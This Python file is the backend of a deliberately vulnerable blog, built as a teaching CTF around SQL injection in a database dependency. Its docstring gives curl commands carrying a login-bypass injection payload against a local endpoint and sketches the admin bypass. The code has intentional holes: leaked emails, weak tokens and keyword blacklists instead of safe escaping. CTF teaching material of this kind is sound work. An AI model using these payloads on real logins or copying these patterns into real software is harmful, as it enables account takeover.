"""
Personal Blog Backend — CTF Demonstration Service
=================================================

This module implements a deliberately simplified backend service used as a
**teaching-oriented Capture The Flag (CTF) example**.

The project is not intended to represent a secure or production-ready system.
Instead, it serves as a concrete demonstration of how real-world vulnerabilities
can arise **from third-party dependencies**, rather than from application logic
written by developers.

Context and Purpose
-------------------
This service is built as a showcase around the ``sqli_ctf`` project (``ctf_sql``),
and models a vulnerability inspired by **CVE-2019-12989**.

The core lesson of this CTF is:

    "The vulnerability modeled here originated from a *third-party dependency*,
    not from the application's own business logic."

In other words, even when application code appears reasonable and structured,
security can still be compromised due to unsafe behavior in underlying libraries.
This is a common and realistic failure mode in real systems.

Design Simplifications
----------------------
To keep the focus on the intended learning objectives, several components are
intentionally simplified:

* **JWT implementation**
  - JWTs are intentionally lightweight.
  - A simple, custom ``proof`` value is embedded in tokens to demonstrate
    token binding logic.
  - The proof mechanism is *not cryptographically strong* and can be broken
    by analyzing backend logic or through repeated attempts.
  - This weakness is acceptable here because the goal is demonstration, not defense.

* **Authentication model**
  - The system distinguishes between normal users and administrators.
  - Separate JWT secrets and proof logic are used to highlight role separation,
    not to provide real-world security guarantees.

CTF Constraints and Intentional Limitations
--------------------------------------------
Several constraints are intentionally imposed to guide participants toward the
intended attack vector:

* **Mock password hashes**
  - Password hashes stored in the database are *intentionally invalid* and do **not**
    correspond to real SHA-256 outputs.
  - This prevents participants from attacking the system by guessing or cracking
    passwords.

* **Enforced attack path**
  - Because password guessing is infeasible by design, participants are forced
    to use the **intended SQL injection vulnerability** as taught in the exercise.
  - SQL injection is chosen deliberately, as it is one of the most accessible and
    illustrative classes of vulnerabilities for educational purposes.

CTF Mode
--------
As a CTF Project, Only CTF Mode is activated, no production.

Summary
-------
This codebase is a **controlled, educational example** designed to show:

* How dependency-level flaws can undermine otherwise clean application code
* Why SQL injection remains a critical and common vulnerability
* How CTF challenges can be structured to enforce specific learning outcomes

It should be studied as a teaching artifact, not used as a security reference.

Note:
-------
For the User Login section, our backend uses ``AND`` to inject code, but this presents an additional challenge for
the frontend by disabling ``AND``. Therefore, the solution is either to manipulate the code in the JavaScript or to
directly interact with the backend (this is a deliberate point of interaction where the frontend and backend
share the same port).

For learners unfamiliar with creating JavaScript payloads, we recommend using the terminal directly.

* macOS:

  ````
  curl -s -X POST http://127.0.0.1:8000/api/login/user \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=alice@example.com'AND ('1')#" \
    --data-urlencode "password=anything" \
    | jq -r '"http://127.0.0.1:8000/personal_space?username=\(.username)&jwt=\(.jwt)"' \
    | xargs open
  ````

* **Linux**:

  ````
  curl -s -X POST http://127.0.0.1:8000/api/login/user \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=alice@example.com'AND ('1')#" \
    --data-urlencode "password=anything" \
    | jq -r '"http://127.0.0.1:8000/personal_space?username=\(.username)&jwt=\(.jwt)"' \
    | xargs xdg-open
  ````

The injection in the admin login section actually uses dependencies ``or`` relationships, but
the ``OR`` keyword itself is not allowed. Users need to understand that ``||`` and ``OR`` are equivalent.
"""

import hashlib
import os
import re
from collections.abc import Callable
from typing import Optional

from fastapi import FastAPI, HTTPException
from fastapi import Form  # python-multipart support
from fastapi import Query
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import builtins

builtins.CTF_MODE = "ctf"

from sqli_ctf import ctf_sql
from .config import ADMIN_URL, ADMIN_LOGIN_URL, dump_config
from .jwt_plugin import (
    make_user_token, make_admin_token,
    verify_user_token, verify_admin_token
)

app = FastAPI(title="Personal Blog Backend")

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
STATIC_DIR = os.path.join(BASE_DIR, "static")

dump_config()

app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

"""
Why design a global user? 
Firstly, there are no concurrency issues in monolithic operations, making global operations suitable for CTFs.

Secondly, we are essentially checking whether a user truly found a user named "alice" through `/api/home` 
and obtained the actual JWT using the leaked email address and SQLI.

Guessing an email address does not count towards the score.
"""
global_user: Optional[str] = None


def get_conn(sanitizer: Optional[Callable[[str], str]] = None):
    """
    Create a database connection
    """
    print(f"acquiring connection from: {ctf_sql.constants.CTF_SESSION_NAME}")
    if ctf_sql.SESSION_NAME == ctf_sql.constants.CTF_SESSION_NAME:
        return ctf_sql.MySql.connect(
            host=ctf_sql.DB_HOST,
            user=ctf_sql.DB_USER,
            passwd=ctf_sql.DB_PASS,
            db=ctf_sql.DB_NAME,
            sanitizer=sanitizer,
        )
    return ctf_sql.MySql.connect(
        host=ctf_sql.DB_HOST,
        user=ctf_sql.DB_USER,
        passwd=ctf_sql.DB_PASS,
        db=ctf_sql.DB_NAME,
    )


# =========================
# HTML Routes
# =========================

@app.get("/", response_class=HTMLResponse)
async def serve_index():
    with open(os.path.join(FRONTEND_DIR, "index.html"), "r") as f:
        return f.read()


@app.get(ADMIN_URL, response_class=HTMLResponse)
async def serve_admin():
    path = os.path.join(FRONTEND_DIR, "admin.html")
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()

    # Replace __ADMIN_LOGIN__ with "ADMIN_LOGIN_URL"
    content = content.replace("__ADMIN_LOGIN__", f'"{ADMIN_LOGIN_URL}"')

    return content


@app.get(ADMIN_LOGIN_URL, response_class=HTMLResponse)
async def serve_admin_login():
    path = os.path.join(FRONTEND_DIR, "admin_login.html")
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()

    # Replace _ADMIN_ with ADMIN_URL
    content = content.replace("_ADMIN_", ADMIN_URL)

    return content


@app.get("/personal_space", response_class=HTMLResponse)
async def serve_personal_space():
    with open(os.path.join(FRONTEND_DIR, "personal_space.html"), "r") as f:
        return f.read()


@app.get("/favicon.ico")
async def fake_favicon():
    raise HTTPException(
        status_code=404,
        detail="Not Found. Static assets may be accessible under /static"
    )


# =========================
# Public APIs
# =========================

@app.get("/api/home")
def home():
    """
    Fetch recent published posts for the homepage
    """
    conn = get_conn()
    cur = conn.cursor()

    cur.execute("""
        SELECT
          p.id,
          p.title,
          p.created_at,
          u.username,
          u.email,
          COUNT(c.id) AS comment_count
        FROM posts p
        JOIN users u ON p.author_id = u.id
        LEFT JOIN comments c ON c.post_id = p.id
        WHERE p.is_published = %s
        GROUP BY p.id
        ORDER BY comment_count DESC, p.created_at DESC
        LIMIT 10
    """, (1,))

    rows = cur.fetchall()
    cur.close()
    conn.close()

    res = [
        {
            "post_id": r[0],
            "title": r[1],
            "created_at": r[2],
            "author": r[3],
            "email": r[4],  # intentional information exposure
            "comments": r[5],
        }
        for r in rows
    ]
    global global_user

    global_user = None if len(res) == 0 else res[0]["author"]

    return res


@app.get("/api/user/{username}")
def user_page(
        username: str,
        jwt_token: str = Query(..., alias="jwt"),
):
    """
    Fetch personal posts for a specific user after JWT validation
    """
    # 1. Verify JWT
    payload = verify_user_token(jwt_token, username)
    if not payload:
        raise HTTPException(
            status_code=401,
            detail="Invalid or expired token",
        )

    # 2. JWT verified, query database
    conn = get_conn()
    cur = conn.cursor()

    cur.execute("""
        SELECT
          p.id,
          p.title,
          p.created_at
        FROM users u
        JOIN posts p ON p.author_id = u.id
        WHERE u.username = %s
        ORDER BY p.created_at DESC
    """, (username,))

    rows = cur.fetchall()
    cur.close()
    conn.close()

    return {
        "username": username,
        "posts": [
            {
                "post_id": r[0],
                "title": r[1],
                "created_at": r[2],
            }
            for r in rows
        ],
    }


# =========================
# Authentication APIs
# =========================

def sanitize_email(email: str) -> str:
    email = email.strip()
    email = re.sub(r'[\n\t\r]', ' ', email)

    ILLEGALS = ['OR', '=', '>', '<', 'LIKE', 'IN', 'BETWEEN', 'TRUE', 'FALSE', '--', '|', '\'#', ' #']

    """
    no OR logic (including '||')
    no direct "alice@example.com' #" or "alice@example.com'#"
    The respondent is forced to construct a tautology condition to place after the AND operation.
    """

    upper_email = email.upper()

    if any(illegal in upper_email for illegal in ILLEGALS):
        raise ValueError

    if re.search(r'AND\s+\d+', upper_email):
        # direct 'AND 1'
        raise ValueError

    if re.match(r'^.*\(\s*(?:\d[\s\S]*?|[\s\S]*?\d)\s*\).*', upper_email):
        # direct '(1)'
        raise ValueError

    # "alice@example.com' AND ('1')#" is the only possible ctf sqli form

    return email


def sanitize_admin(admin_name: str) -> str:
    admin_name = admin_name.strip()
    admin_name = re.sub(r'[\n\t\r]', ' ', admin_name)
    pattern = r"^(?:[^']*$|[^']*?(?:[A-Za-z][^']*){5}')"

    ILLEGALS = ['OR', '=', '>', '<', 'LIKE', 'IN', 'BETWEEN', 'TRUE', 'FALSE', '--', 'AND', '\'#', ' #']

    """
    The respondent is forced to construct a tautology condition to place after the OR(||) operation.
    """

    upper_admin_name = admin_name.upper()

    if any(illegal in upper_admin_name for illegal in ILLEGALS):
        raise ValueError

    if not re.match(pattern, admin_name):
        # admin should have no quote
        # OR at least 5 latin letters before the first quote
        raise ValueError

    if re.search(r'\|\|\s+\d+', upper_admin_name):
        # direct '|| 1'
        raise ValueError

    if re.match(r'^.*\(\s*(?:\d[\s\S]*?|[\s\S]*?\d)\s*\).*', upper_admin_name):
        # direct '(1)'
        raise ValueError

    # "{at least 5 latins}' || ('1')#" is the only possible ctf sqli form

    return admin_name


@app.post("/api/login/user")
def login_user(
        email: str = Form(...),
        password: str = Form(...),
):
    conn = None
    cur = None

    try:
        conn = get_conn(sanitize_email)
        cur = conn.cursor()

        pattern = r'^[^@]+@[^@\.]+\.[^@\.]+'

        if not re.match(pattern, email):
            return {
                "success": False,
                "username": None,
                "jwt": None,
                "error": "not an email",
            }

        password_hash = hashlib.sha256(password.encode()).hexdigest()

        cur.execute("""
            SELECT id, username, email
            FROM users
            WHERE email = %s AND password_hash = %s
        """, (email, password_hash))

        row = cur.fetchone()

        if not row:
            return {
                "success": False,
                "username": None,
                "jwt": None,
                "error": "invalid_credentials",
            }

        user_id, real_username, email = row

        jwt_ = make_user_token(real_username, email)

        return {
            "success": True,
            "username": real_username,
            "jwt": jwt_,
        }

    except (ctf_sql.MySql.MySQLError, ValueError):

        return {
            "success": False,
            "username": None,
            "jwt": None,
            "error": "login_failed",
        }

    finally:
        if cur is not None:
            cur.close()
        if conn is not None:
            conn.close()


@app.post("/api/login/admin")
def login_admin(
        username: str = Form(...),
        password: str = Form(...),
):
    conn = None
    cur = None

    try:
        conn = get_conn(sanitize_admin)
        cur = conn.cursor()

        password_hash = hashlib.sha256(password.encode()).hexdigest()

        cur.execute("""
            SELECT id FROM admins
            WHERE username = %s AND password_hash = %s
        """, (username, password_hash))

        row = cur.fetchone()

        if not row:
            return {
                "success": False,
                "jwt": None,
            }

        admin_jwt = make_admin_token(username)

        return {
            "success": True,
            "username": username,
            "jwt": admin_jwt,
        }

    except (ctf_sql.MySql.MySQLError, ValueError):

        return {
            "success": False,
            "jwt": None,
            "error": "login_failed",
        }

    finally:
        if cur is not None:
            cur.close()
        if conn is not None:
            conn.close()


@app.get("/api/admin/check")
def check_admin(jwt_token: str = Query(..., alias="jwt")):
    """
    Validate admin JWT
    """
    payload = verify_admin_token(jwt_token)
    if not payload:
        raise HTTPException(status_code=401, detail="Invalid admin token")

    return {
        "success": True,
        "admin": payload["username"],
        "login_ts": payload["login_ts"],
    }


# =========================
# CTF Progress API
# =========================

@app.post("/api/user/answer/{jwt}")
def user_answer(jwt: str):
    if ctf_sql.SESSION_NAME != ctf_sql.constants.CTF_SESSION_NAME:
        return {"success": False, "error": "ctf_disabled"}

    payload = verify_user_token(jwt, username=global_user)
    if not payload:
        raise HTTPException(status_code=401, detail="invalid_user_jwt")

    conn = get_conn()
    cur = conn.cursor()

    cur.execute("""
        UPDATE ctf_progress
        SET user_pwned = TRUE
        WHERE id = 1 AND user_pwned = FALSE
    """)
    conn.commit()

    cur.close()
    conn.close()

    return {
        "success": True,
        "flag": "user",
    }


@app.post("/api/admin/answer/{jwt}")
def admin_answer(jwt: str):
    if ctf_sql.SESSION_NAME != ctf_sql.constants.CTF_SESSION_NAME:
        return {"success": False, "error": "ctf_disabled"}

    payload = verify_admin_token(jwt)
    if not payload:
        raise HTTPException(status_code=401, detail="invalid_admin_jwt")

    conn = get_conn()
    cur = conn.cursor()

    cur.execute("""
        UPDATE ctf_progress
        SET admin_pwned = TRUE
        WHERE id = 1 AND admin_pwned = FALSE
    """)
    conn.commit()

    cur.close()
    conn.close()

    return {
        "success": True,
        "flag": "admin",
    }


@app.get("/api/flags")
def flags():
    """
    Return CTF progress flags (only available in CTF mode)
    """
    # 1. Check whether CTF mode is enabled
    ctf_enabled = (
            ctf_sql.SESSION_NAME
            == ctf_sql.constants.CTF_SESSION_NAME
    )

    # 2. Non-CTF mode: do not expose any flag data
    if not ctf_enabled:
        return {
            "ctf_enabled": False,
            "flags": None,
        }

    # 3. CTF mode: read progress table
    conn = get_conn()
    cur = conn.cursor()

    cur.execute("""
        SELECT user_pwned, admin_pwned
        FROM ctf_progress
        WHERE id = 1
    """)

    row = cur.fetchone()
    cur.close()
    conn.close()

    user_pwned = bool(row[0])
    admin_pwned = bool(row[1])

    return {
        "ctf_enabled": True,
        "flags": {
            "total_flags": 2,
            "user_pwned": user_pwned,
            "admin_pwned": admin_pwned,
            "flags_obtained": int(user_pwned) + int(admin_pwned),
        },
    }
